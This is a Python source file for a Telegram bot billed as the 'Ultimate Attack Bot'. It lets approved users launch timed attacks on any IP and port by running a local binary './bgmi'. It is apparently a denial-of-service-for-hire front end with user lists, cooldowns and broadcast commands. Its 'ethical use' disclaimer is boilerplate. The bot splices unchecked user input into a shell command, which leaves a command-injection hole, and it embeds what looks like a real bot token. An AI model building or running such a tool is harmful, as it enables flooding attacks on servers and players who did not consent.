import asyncio
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7252565213:AAGhR0Xq6OpWFWAeIAPIWjYmtCpITvz_s_0'  # Replace with your actual Telegram bot token
ADMIN_USER_ID = 1342302666  # Replace with your admin user ID
USERS_FILE = 'users.txt'
attack_in_progress = False
cooldowns = {}  # Dictionary to track user cooldowns

# Constants
MAX_DURATION = 180  # Maximum attack duration in seconds
COOLDOWN_PERIOD = 300  # Cooldown period in seconds (5 minutes)

# Load and save users
def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

# Command Handlers
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*⚡ Welcome to the Ultimate Attack Bot! ⚡*\n\n"
        "This bot is designed for ethical and legitimate use only. Please ensure you have explicit permission before launching any attack.\n\n"
        "*Type `/help`* for a list of available commands."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔹 Available Commands:* \n\n"
        "1️⃣ `/attack <ip> <port> <duration>` - Launch an attack on the target IP and port for the specified duration. (Cooldown applies after each attack for non-admin users)\n"
        "2️⃣ `/admin <add|rem> <user_id>` - (Admin only) Manage user permissions (add or remove).\n"
        "3️⃣ `/user` - (Admin only) View all registered users.\n"
        "4️⃣ `/broadcast <message>` - (Admin only) Send a broadcast message to all users.\n\n"
        "*⚠️ Please use this bot responsibly and only target systems with permission.*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def admin(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Only the admin can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Usage: `/admin <add|rem> <user_id>`", parse_mode='Markdown')
        return

    command, target_user_id = args
    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"✔️ *User {target_user_id} added to the approved list.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"✔️ *User {target_user_id} removed from the approved list.*", parse_mode='Markdown')

async def user(update: Update, context: CallbackContext):
    """Admin command to view all users."""
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Only the admin can use this command.*", parse_mode='Markdown')
        return

    if not users:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ No users are currently registered.", parse_mode='Markdown')
        return

    user_list = "\n".join(users)
    await context.bot.send_message(chat_id=chat_id, text=f"📋 *Registered Users:*\n{user_list}", parse_mode='Markdown')

async def broadcast(update: Update, context: CallbackContext):
    """Admin command to broadcast a message to all users."""
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Only the admin can use this command.*", parse_mode='Markdown')
        return

    if not users:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ No users to broadcast to.", parse_mode='Markdown')
        return

    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Usage: `/broadcast <message>`", parse_mode='Markdown')
        return

    message = " ".join(context.args)
    for user_id in users:
        try:
            await context.bot.send_message(chat_id=user_id, text=f"📢 *Broadcast Message:*\n{message}", parse_mode='Markdown')
        except Exception as e:
            print(f"Failed to send message to user {user_id}: {e}")

    await context.bot.send_message(chat_id=chat_id, text="✔️ *Broadcast message sent to all users.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    # Notify attack started and send a timer message
    attack_message = await context.bot.send_message(
        chat_id=chat_id,
        text=f"🚀 *Attack Started!*\n🎯 Target: {ip}:{port}\n⏳ Duration: {duration} seconds.",
        parse_mode='Markdown'
    )

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ *Error during attack: {e}*", parse_mode='Markdown')
    finally:
        attack_in_progress = False

    await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Completed!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    # Check if the user is in the allowed list
    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ You need to be approved to use this bot.", parse_mode='Markdown')
        return

    # Apply cooldown only to non-admin users
    current_time = time.time()
    if user_id != str(ADMIN_USER_ID):  # Admin is exempt from cooldown
        if user_id in cooldowns and current_time - cooldowns[user_id] < COOLDOWN_PERIOD:
            remaining_cooldown = int(COOLDOWN_PERIOD - (current_time - cooldowns[user_id]))
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"⚠️ You must wait {remaining_cooldown} seconds before launching another attack.",
                parse_mode='Markdown'
            )
            return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Another attack is already in progress. Please wait.", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Usage: /attack <ip> <port> <duration>", parse_mode='Markdown')
        return

    ip, port, duration = args
    duration = int(duration)

    # Enforce maximum duration
    if duration > MAX_DURATION:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"⚠️ Maximum attack duration is {MAX_DURATION} seconds. Adjusting your request.",
            parse_mode='Markdown'
        )
        duration = MAX_DURATION

    # Attack starts successfully, apply cooldown
    if user_id != str(ADMIN_USER_ID):  # Apply cooldown to non-admin users
        cooldowns[user_id] = current_time

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Register command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("admin", admin))
    application.add_handler(CommandHandler("user", user))
    application.add_handler(CommandHandler("broadcast", broadcast))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()